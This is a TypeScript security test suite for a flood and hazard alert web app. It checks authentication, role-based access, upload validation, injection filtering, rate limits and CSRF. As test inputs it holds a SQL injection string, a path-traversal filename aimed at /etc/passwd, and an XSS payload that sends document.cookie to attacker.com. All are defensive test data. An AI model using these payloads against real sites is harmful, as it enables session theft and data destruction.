/**
 * AGIES ALERT - Automated Production Security Verification Test Suite
 * Tests Authentication, RBAC, File Upload Validation, Magic Bytes, SQLi/XSS Prevention,
 * Rate Limiting, CORS & Security Headers, CSRF, and Information Leakage Prevention.
 */

import { handleBackendApiRequest } from '../server/router';
import { FileValidationMiddleware } from '../server/middleware/fileValidationMiddleware';
import { SanitizationMiddleware } from '../server/middleware/sanitizationMiddleware';
import { RateLimiter } from '../server/middleware/rateLimiter';
import { RealtimeHub } from '../server/services/RealtimeHub';

async function runSecurityTestSuite() {
  console.log('🛡️  Starting AGIES ALERT Production Security Verification Pass...\n');
  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, testName: string, detail?: string) {
    if (condition) {
      console.log(`  ✅ PASS: ${testName}`);
      passed++;
    } else {
      console.error(`  ❌ FAIL: ${testName}${detail ? ` -> ${detail}` : ''}`);
      failed++;
    }
  }

  // ------------------------------------------------------------------------
  // 1. HTTP Security Headers & CORS Preflight
  // ------------------------------------------------------------------------
  console.log('--- 1. HTTP Security Headers & CORS ---');
  {
    const res = await handleBackendApiRequest({
      method: 'OPTIONS',
      url: '/api/alerts',
      path: '/api/alerts',
      query: {},
      headers: { origin: 'http://localhost:5173' },
      clientIp: '10.0.0.1',
    });

    assert(res.status === 204, 'OPTIONS preflight returns HTTP 204');
    assert(res.headers['X-Content-Type-Options'] === 'nosniff', 'Header X-Content-Type-Options is nosniff');
    assert(res.headers['X-Frame-Options'] === 'DENY', 'Header X-Frame-Options is DENY (Anti-Clickjacking)');
    assert(!!res.headers['Content-Security-Policy'], 'Content-Security-Policy is present and configured');
    assert(res.headers['Strict-Transport-Security'].includes('max-age'), 'HSTS header configured');
    assert(res.headers['Access-Control-Allow-Origin'] === 'http://localhost:5173', 'CORS origin allowed correctly');
  }

  // ------------------------------------------------------------------------
  // 2. Authentication & RBAC Authorization
  // ------------------------------------------------------------------------
  console.log('\n--- 2. Authentication & Role-Based Access Control (RBAC) ---');
  {
    // A. Unauthenticated access to protected admin route
    const unauthAdmin = await handleBackendApiRequest({
      method: 'GET',
      url: '/api/admin/audit-logs',
      path: '/api/admin/audit-logs',
      query: {},
      headers: {},
      clientIp: '10.0.0.2',
    });
    assert(unauthAdmin.status === 401, 'Unauthenticated access to /api/admin/audit-logs returns 401 Unauthorized');

    // B. Login as Citizen
    const citizenLogin = await handleBackendApiRequest({
      method: 'POST',
      url: '/api/auth/login',
      path: '/api/auth/login',
      query: {},
      headers: {},
      body: { email: 'citizen.test@agies.gov.in', role: 'citizen' },
      clientIp: '10.0.0.2',
    });
    assert(citizenLogin.status === 200 && citizenLogin.body.data?.token, 'Login returns valid token and user session');
    const citizenToken = citizenLogin.body.data?.token;

    // C. Citizen attempting to access Admin Audit Logs -> 403 Forbidden
    const forbiddenAdmin = await handleBackendApiRequest({
      method: 'GET',
      url: '/api/admin/audit-logs',
      path: '/api/admin/audit-logs',
      query: {},
      headers: { authorization: `Bearer ${citizenToken}` },
      clientIp: '10.0.0.2',
    });
    assert(forbiddenAdmin.status === 403, 'Citizen role accessing /api/admin/audit-logs is blocked with 403 Forbidden');

    // D. Official accessing Admin Audit Logs -> 200 OK
    const officialAdmin = await handleBackendApiRequest({
      method: 'GET',
      url: '/api/admin/audit-logs',
      path: '/api/admin/audit-logs',
      query: {},
      headers: { authorization: 'Bearer demo-official-token' },
      clientIp: '10.0.0.2',
    });
    assert(officialAdmin.status === 200 && Array.isArray(officialAdmin.body.data?.logs), 'Official role authorized for audit logs');

    // E. Admin accessing System Status -> 200 OK
    const adminStatus = await handleBackendApiRequest({
      method: 'GET',
      url: '/api/admin/system-status',
      path: '/api/admin/system-status',
      query: {},
      headers: { authorization: 'Bearer demo-admin-token' },
      clientIp: '10.0.0.2',
    });
    assert(adminStatus.status === 200 && adminStatus.body.data?.securityPosture === 'HARDENED', 'Admin role authorized for system status');
  }

  // ------------------------------------------------------------------------
  // 3. File Upload Validation & Binary Magic Byte Checks
  // ------------------------------------------------------------------------
  console.log('\n--- 3. File Upload, MIME & Executable Blocklist Validation ---');
  {
    // A. Prohibit executable .exe uploads
    const exeUpload = await handleBackendApiRequest({
      method: 'POST',
      url: '/api/reports/media',
      path: '/api/reports/media',
      query: {},
      headers: {},
      body: { fileName: 'malicious_payload.exe', fileType: 'application/x-msdownload' },
      clientIp: '10.0.0.3',
    });
    assert(exeUpload.status === 400 && exeUpload.body.error?.code === 'FILE_REJECTED', 'Executable .exe upload is strictly rejected (400)');

    // B. Prohibit script .sh and .php uploads
    const phpUpload = await handleBackendApiRequest({
      method: 'POST',
      url: '/api/reports/media',
      path: '/api/reports/media',
      query: {},
      headers: {},
      body: { fileName: 'shell.php', fileType: 'application/x-php' },
      clientIp: '10.0.0.3',
    });
    assert(phpUpload.status === 400, 'PHP script upload is strictly rejected');

    // C. Prohibit oversized image (> 10MB)
    const oversizedImg = await handleBackendApiRequest({
      method: 'POST',
      url: '/api/reports/media',
      path: '/api/reports/media',
      query: {},
      headers: {},
      body: { fileName: 'huge_flood.jpg', fileType: 'image/jpeg', fileSizeBytes: 15 * 1024 * 1024 },
      clientIp: '10.0.0.3',
    });
    assert(oversizedImg.status === 400 && oversizedImg.body.error?.message.includes('10 MB'), 'Oversized image (>10MB) rejected');

    // D. Prohibit oversized video (> 50MB)
    const oversizedVideo = await handleBackendApiRequest({
      method: 'POST',
      url: '/api/reports/media',
      path: '/api/reports/media',
      query: {},
      headers: {},
      body: { fileName: 'massive_flood.mp4', fileType: 'video/mp4', fileSizeBytes: 65 * 1024 * 1024 },
      clientIp: '10.0.0.3',
    });
    assert(oversizedVideo.status === 400 && oversizedVideo.body.error?.message.includes('50 MB'), 'Oversized video (>50MB) rejected');

    // E. Accept legitimate JPEG image with magic bytes
    // Base64 JPEG header: /9j/ (0xFF 0xD8 0xFF)
    const validJpegBase64 = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=';
    const validUpload = await handleBackendApiRequest({
      method: 'POST',
      url: '/api/reports/media',
      path: '/api/reports/media',
      query: {},
      headers: {},
      body: { fileName: 'flood_underpass_evidence.jpg', base64Content: validJpegBase64 },
      clientIp: '10.0.0.3',
    });
    assert(validUpload.status === 201 && validUpload.body.data?.mediaUrl, 'Verified JPEG with magic bytes is accepted (201 Created)');

    // F. Filename path traversal sanitization
    const sanitizedName = FileValidationMiddleware.sanitizeFilename('../../../etc/passwd_incident.png');
    assert(!sanitizedName.includes('..') && !sanitizedName.includes('/'), 'Path traversal characters in filename sanitized');
  }

  // ------------------------------------------------------------------------
  // 4. SQL Injection & XSS Protection
  // ------------------------------------------------------------------------
  console.log('\n--- 4. SQL Injection & XSS Protection ---');
  {
    // A. SQL injection detection
    const sqliAttempt = "'; DROP TABLE citizen_reports; --";
    assert(SanitizationMiddleware.containsSqlInjection(sqliAttempt), 'SQL Injection signature detected');

    // B. XSS script tag detection & stripping
    const xssPayload = "<script>alert('Exploit')</script>Emergency flooding reported!";
    const stripped = SanitizationMiddleware.stripHtmlTags(xssPayload);
    assert(!stripped.includes('<script>') && stripped.includes('Emergency flooding'), 'HTML/XSS tags stripped from input');

    // C. Dangerous payload in Incident Report submission is blocked/sanitized
    const maliciousReport = await handleBackendApiRequest({
      method: 'POST',
      url: '/api/reports',
      path: '/api/reports',
      query: {},
      headers: {},
      body: {
        hazardType: 'Flood',
        description: "Severe flooding detected <script>window.location='http://attacker.com/steal?cookie='+document.cookie</script>",
        severity: 'high',
        location: {
          lat: 19.0760,
          lng: 72.8777,
          address: 'Andheri Subway',
        },
      },
      clientIp: '10.0.0.4',
    });
    assert(maliciousReport.status === 400 || (maliciousReport.status === 201 && !maliciousReport.body.data?.description.includes('<script>')), 'XSS payload in report submission safely neutralized');

    // D. Geographic coordinate validation
    const outOfBoundsReport = await handleBackendApiRequest({
      method: 'POST',
      url: '/api/reports',
      path: '/api/reports',
      query: {},
      headers: {},
      body: {
        hazardType: 'Flood',
        description: 'Flooding in test zone with invalid coordinates',
        severity: 'medium',
        location: {
          lat: 999.99, // Invalid
          lng: 72.8777,
          address: 'Test City',
        },
      },
      clientIp: '10.0.0.4',
    });
    assert(outOfBoundsReport.status === 400, 'Out-of-bounds coordinates (lat 999.99) rejected with 400 VALIDATION_ERROR');
  }

  // ------------------------------------------------------------------------
  // 5. Sliding Window Rate Limiting
  // ------------------------------------------------------------------------
  console.log('\n--- 5. Sliding Window Rate Limiting ---');
  {
    RateLimiter.reset();
    const testIp = '192.168.1.99';
    let blockedCount = 0;

    // Endpoint limit for AI chat is 20 per minute
    for (let i = 0; i < 25; i++) {
      const res = await handleBackendApiRequest({
        method: 'POST',
        url: '/api/ai/chat',
        path: '/api/ai/chat',
        query: {},
        headers: {},
        body: { message: `AI prompt #${i}` },
        clientIp: testIp,
      });
      if (res.status === 429) {
        blockedCount++;
      }
    }

    assert(blockedCount === 5, `Rate limiter successfully throttled 5 requests exceeding limit (429 HTTP status)`);
  }

  // ------------------------------------------------------------------------
  // 6. CSRF Token Protection
  // ------------------------------------------------------------------------
  console.log('\n--- 6. CSRF Protection ---');
  {
    const csrfRes = await handleBackendApiRequest({
      method: 'GET',
      url: '/api/csrf-token',
      path: '/api/csrf-token',
      query: {},
      headers: {},
      clientIp: '10.0.0.6',
    });

    assert(csrfRes.status === 200 && !!csrfRes.body.data?.csrfToken, 'CSRF token endpoint generates valid token');
    assert(!!csrfRes.headers['Set-Cookie'] && csrfRes.headers['Set-Cookie'].includes('HttpOnly'), 'CSRF cookie contains HttpOnly and SameSite=Strict');
  }

  // ------------------------------------------------------------------------
  // 7. Safe Error Handling & Stack Trace Redaction
  // ------------------------------------------------------------------------
  console.log('\n--- 7. Error Handling & Stack Trace Redaction ---');
  {
    const missingEndpoint = await handleBackendApiRequest({
      method: 'GET',
      url: '/api/non-existent-secret-path',
      path: '/api/non-existent-secret-path',
      query: {},
      headers: {},
      clientIp: '10.0.0.7',
    });

    assert(missingEndpoint.status === 404, '404 handled cleanly without crashing');
    assert(missingEndpoint.body.success === false, 'Error response formatted with standard schema');
    assert(!missingEndpoint.body.error?.stack, 'Internal stack trace is NOT exposed in error response');
  }

  // -------------------------------------------------------------
  // 9. Safe Public API Discovery (No Credential Leakage)
  // -------------------------------------------------------------
  console.log('\n--- 9. Safe Public API Discovery ---');
  {
    const discovery = await handleBackendApiRequest({
      method: 'GET',
      url: '/api/discovery',
      path: '/api/discovery',
      query: {},
      headers: {},
      clientIp: '10.0.0.8',
    });

    assert(discovery.status === 200, 'Discovery endpoint returns HTTP 200');
    assert(discovery.body.data?.status === 'HEALTHY', 'Discovery reports HEALTHY system state');
    assert(!!discovery.body.data?.endpoints?.weather, 'Discovery catalogs endpoints correctly');

    const jsonString = JSON.stringify(discovery.body);
    assert(!jsonString.includes('SECRET'), 'No JWT/Admin secrets leaked in discovery');
    assert(!jsonString.includes('API_KEY'), 'No provider API keys leaked in discovery');
    assert(!jsonString.includes('password'), 'No database credentials leaked in discovery');
  }

  // Summary
  console.log(`\n========================================`);
  console.log(`Security Test Summary: ${passed} PASSED, ${failed} FAILED`);
  console.log(`========================================\n`);

  RealtimeHub.stopHeartbeat();

  process.exit(failed > 0 ? 1 : 0);
}

runSecurityTestSuite().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
